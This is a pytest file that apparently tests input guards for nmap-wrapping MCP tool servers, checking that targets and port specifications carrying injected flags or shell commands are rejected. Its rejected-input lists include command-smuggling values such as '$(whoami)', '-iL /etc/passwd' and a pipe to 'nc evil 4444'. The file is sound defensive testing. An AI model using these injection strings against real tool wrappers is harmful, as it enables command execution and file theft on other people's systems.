"""Tests for the argv shape checks used by the MCP tool servers."""

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "mcp_servers"))

from mcp_guard import validate_ports, validate_target


@pytest.mark.parametrize(
    "target",
    [
        "192.168.1.10",
        "example.com",
        "sub.example.co.uk",
        "my-host.example.com",
        "10.0.0.0/8",
        "::1",
        "[::1]",
        "2001:db8::1",
    ],
)
def test_valid_targets_accepted(target):
    assert validate_target(target) is None, target


@pytest.mark.parametrize(
    "target",
    [
        "-iL /etc/passwd",
        "-oN/tmp/out",
        "--script=vuln",
        "-",
        "-sV example.com",
    ],
)
def test_option_like_targets_rejected(target):
    """nmap would parse these as its own flags, not as a host."""
    problem = validate_target(target)
    assert problem is not None
    assert "option" in problem


@pytest.mark.parametrize(
    "target",
    [
        "example.com; id",
        "example.com && id",
        "example.com | nc evil 4444",
        "$(id)",
        "`id`",
        "example.com$(whoami)",
        "exam ple.com",
        "example.com\nnmap",
    ],
)
def test_shell_metacharacters_rejected(target):
    assert validate_target(target) is not None


def test_empty_target_rejected():
    assert validate_target("") is not None


def test_path_traversal_rejected():
    assert validate_target("../../etc/passwd") is not None


def test_overlong_target_rejected():
    assert validate_target("a" * 256) is not None


@pytest.mark.parametrize("ports", ["", "80", "80,443", "1-1000", "22,80,8000-8100"])
def test_valid_port_specs_accepted(ports):
    assert validate_ports(ports) is None


@pytest.mark.parametrize("ports", ["80 443", "80;443", "-p", "80 -oN /tmp/x", "abc"])
def test_invalid_port_specs_rejected(ports):
    assert validate_ports(ports) is not None
